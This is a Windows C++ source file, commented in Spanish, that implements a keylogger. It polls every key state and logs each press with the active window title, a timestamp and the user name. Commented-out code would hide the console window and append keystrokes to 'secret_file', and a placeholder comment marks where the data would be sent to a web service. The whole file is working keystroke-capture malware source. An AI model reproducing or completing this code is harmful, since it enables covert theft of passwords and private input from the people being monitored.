#include<Windows.h>
#include<iostream>
#include<fstream>
#include<string>
#include<ctime>
#include<lmcons.h>

using namespace std;

//Variables globales de entorno de ejecución y sus funciones de asignación
string window;
string timestamp;
string name;

void Entorno() {
	const int SizeOfTitleBarText = GetWindowTextLength(GetForegroundWindow());
	char* wnd_title = (char*)malloc(SizeOfTitleBarText + 1);
	GetWindowText(GetForegroundWindow(), wnd_title, SizeOfTitleBarText + 1);
	window = wnd_title;
	free(wnd_title);

	std::time_t time = std::time(nullptr);
	timestamp = std::to_string(time);

	TCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName((TCHAR*)username, &username_len);
	name = username;
}

/*
void EscribirArchivo(LPCSTR texto) {
	ofstream archivo;
	archivo.open("secret_file", fstream::app);
	archivo << texto;
	archivo.close();
}
*/

struct tecla {
	string tiempo;
	string ventana;
	string key;
	string nombre;
} str_key;

bool TeclasPulsadas(int tecla) {
	Entorno();
	str_key.ventana = window;
	str_key.tiempo = timestamp;
	str_key.nombre = "" + name + "_" + timestamp;
	switch (tecla) {
	case VK_SPACE:
		// Process the SPACE key.
		str_key.key = "{ESPACIO}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{ESPACIO}");
		return true;
		break;
	case VK_RETURN:
		// Process the ENTER key.
		cout << "\r\n";
		str_key.key = "{INTRO}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{INTRO}");
		return true;
		break;
	case VK_SHIFT:
		// Process the SHIFT key.
		str_key.key = "{SHIFT}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{SHIFT}");
		return true;
		break;
	case VK_BACK:
		// Process the BACK SPACE key.
		str_key.key = "{RETROCESO}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{RETROCESO}");
		return true;
		break;
	case VK_LEFT:
		// Process the LEFT ARROW key.
		str_key.key = "{LEFT}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{LEFT}");
		return true;
		break;
	case VK_RIGHT:
		// Process the RIGHT ARROW key.
		str_key.key = "{RIGHT}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{RIGHT}");
		return true;
		break;

	case VK_UP:
		// Process the UP ARROW key. 
		str_key.key = "{UP}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{UP}");
		return true;
		break;

	case VK_DOWN:
		// Process the DOWN ARROW key. 
		str_key.key = "{DOWN}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{DOWN}");
		return true;
		break;

	case VK_HOME:
		// Process the HOME key. 
		str_key.key = "{HOME}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{HOME}");
		return true;
		break;

	case VK_END:
		// Process the END key. 
		str_key.key = "{END}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{END}");
		return true;
		break;

	case VK_INSERT:
		// Process the INS key.
		str_key.key = "{INSERT}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{INSERT}");
		return true;
		break;

	case VK_DELETE:
		// Process the DEL key. 
		str_key.key = "{DELETE}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{DELETE}");
		return true;
		break;

	case VK_F1:
		// Process the F1 key.
		str_key.key = "{F1}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{F1}");
		return true;
		break;

	case VK_F2:
		// Process the F2 key.
		str_key.key = "{F2}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{F2}");
		return true;
		break;

	case VK_F3:
		// Process the F3 key.
		str_key.key = "{F3}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{F3}");
		return true;
		break;

	case VK_F4:
		// Process the F4 key.
		str_key.key = "{F4}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{F4}");
		return true;
		break;

	case VK_F5:
		// Process the F5 key.
		str_key.key = "{F5}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{F5}");
		return true;
		break;

	case VK_F6:
		// Process the F6 key.
		str_key.key = "{F6}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{F6}");
		return true;
		break;

	case VK_F7:
		// Process the F7 key.
		str_key.key = "{F7}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{F7}");
		return true;
		break;

	case VK_F8:
		// Process the F8 key.
		str_key.key = "{F8}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{F8}");
		return true;
		break;

	case VK_F9:
		// Process the F9 key.
		str_key.key = "{F9}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{F9}");
		return true;
		break;

	case VK_F10:
		// Process the F10 key.
		str_key.key = "{F10}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{F10}");
		return true;
		break;

	case VK_F11:
		// Process the F11 key.
		str_key.key = "{F11}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{F11}");
		return true;
		break;

	case VK_F12:
		// Process the F12 key.
		str_key.key = "{F12}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		//EscribirArchivo("{F12}");
		return true;
		break;

	default: return false;
	}
}

int main() {
	//FreeConsole();
	unsigned char key;

	//Desplegar Encabezados
	cout << "Tecla\t\t\t";
	cout << "Ventana\t\t\t";
	cout << "Timestamp\t\t\t";
	cout << "Nombre\n";
	cout << "----------------------------------------------------------------------------\n";
	
	while (TRUE) {
		Sleep(10);

		for (key = 8; key <= 255; key++) {
			if (GetAsyncKeyState(key) == -32767) {

				if (TeclasPulsadas(key) == FALSE) {
					str_key.key = key;

					//Envío al web service

					//Impresión de depuración
					cout << str_key.key+"\t";
					cout << str_key.ventana+"\t";
					cout << str_key.tiempo+"\t";
					cout << str_key.nombre+"\n";

					//Volcado a archivo
					/*
					ofstream archivo;
					archivo.open("secret_file", fstream::app);
					archivo << key;
					archivo.close();
					*/
				}
			}
		}
	}
}